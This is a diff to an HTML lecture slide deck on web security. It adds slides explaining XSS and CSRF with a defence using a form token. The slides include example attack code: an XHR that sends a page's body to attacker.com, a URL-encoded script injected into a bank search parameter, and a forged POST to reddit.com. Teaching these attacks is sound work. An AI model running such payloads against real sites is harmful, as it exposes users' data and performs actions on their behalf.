@@ -1958,10 +1958,50 @@ removeObject.deleteMessage(234);</code></pre>
 
   <div class="slide" id="xss">
     <h2>
-      Cross-site scripting (XSS)
+      With Cross-Site Scripting (XSS), a <em>client-side</em> script
+      steals information from a webpage.
     </h2>
-    <ul>
-    </ul>
+    <dl>
+      <dt>attack</dt>
+      <dd class="next">trick another site into executing code in its own space,
+                       exposing or changing user data</dd>
+      <dt>causes</dt>
+      <dd class="next">improper input validation</dd>
+      <dd class="next">trusting third-party content</dd>
+      <dd class="next">social engineering</dd>
+      <dt>defense</dt>
+      <dd class="next">validate input</dd>
+      <dd class="next">add token field on forms</dd>
+    </dl>
+  </div>
+
+  <div class="slide" id="xss-injection">
+    <h2>
+      Injecting JavaScript in pages<br>
+      can steal a user’s personal data.
+    </h2>
+    <h3>Original page echoes <code>assets</code> in contents</h3>
+    <pre><code>https://mybank.com/onlinebanking/?search=assets</code></pre>
+    <h3>Attack code</h3>
+    <pre class="next"><code>(xhr = new XMLHttpRequest()).open('GET',
+  'http://attacker.com/?data=' + document.body.innerHTML);
+xhr.send(null);</code></pre>
+    <h3>Modified URL echoes the attack code in contents</h3>
+    <pre class="next"><code>https://mybank.com/onlinebanking/?search=<ins>%3Cscript%3E(xhr%20%3D%20new</ins></code></pre>
+  </div>
+
+  <div class="slide" id="xss-form">
+    <h2>
+      Submitting a form to another side<br>
+      can execute actions on a user's behalf.
+    </h2>
+    <h3>Attack code placed on third-party website</h3>
+    <pre class="next"><code>(xhr = new XMLHttpRequest()).open('POST',
+  'http://reddit.com/?message=Cheap%20Pills%20For%20Sale');
+xhr.send(null);</code></pre>
+    <h3 class="next">Cross-Site Request Forgery (CSRF) Prevention</h3>
+    <pre class="next"><code>&lt;input name="csrf" type=&quot;hidden&quot; value=&quot;XVduuls7&quot; /&gt;
+&lt;input name="message" type=&quot;text&quot;/&gt;</code></pre>
   </div>
 
   <div class="slide" id="cross-origin-access">
